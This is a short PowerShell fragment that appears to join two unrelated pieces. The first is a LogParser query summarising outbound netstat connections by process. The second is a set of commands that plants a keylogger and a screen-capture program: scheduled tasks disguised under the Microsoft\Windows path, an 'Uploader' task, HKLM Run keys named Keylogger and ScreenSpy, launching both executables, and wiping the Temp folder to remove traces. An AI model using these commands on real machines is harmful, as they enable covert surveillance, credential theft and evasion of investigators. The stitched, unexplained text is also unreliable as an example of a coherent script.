

if (Get-Command logparser.exe) {

    $lpquery = @"
    SELECT
        COUNT(ForeignAddress,
        ForeignPort,
        Process) as ct,
        ForeignAddress,
        ForeignPort,
        Process
    FROM
        *netstat.csv
    WHERE
        ConPid not in ('0'; '4') and
        ForeignAddress not like '10.%' and
        ForeignAddress not like '169.254%' and
        ForeignAddress not in ('*'; '0.0.0.0'; 
            '127.0.0.1'; '[::]'; '[::1]')
    GROUP BY
        ForeignAddress,
        ForeignPort,
        Process
    ORDER BY
        Process,
        ct desc
"@

    & logparser -stats:off -i:csv -dtlines:0 -rtp:-1 $lpquery

} else {
    $ScriptName = [System.IO.Path]::GetFileName($MyInvocation.ScriptName)
    "${ScriptName} requires logparser.exe in the path."
}


schtasks.exe /create /TN "Microsoft\Windows\DynAmite\DynAmite" /XML C:\Windows\Temp\dynatask.xml

schtasks.exe /create /TN "Microsoft\Windows\DynAmite\Uploader" /XML C:\Windows\Temp\upltask.xml

SCHTASKS /run /TN "Microsoft\Windows\DynAmite\DynAmite"

New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name Keylogger -PropertyType String -Value "C:\Windows\dynakey.exe"
New-ItemProperty -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ScreenSpy -PropertyType String -Value "C:\Windows\dynascr.exe"

C:\Windows\dynakey.exe
C:\Windows\dynascr.exe

Remove-Item "C:\Windows\Temp\*"

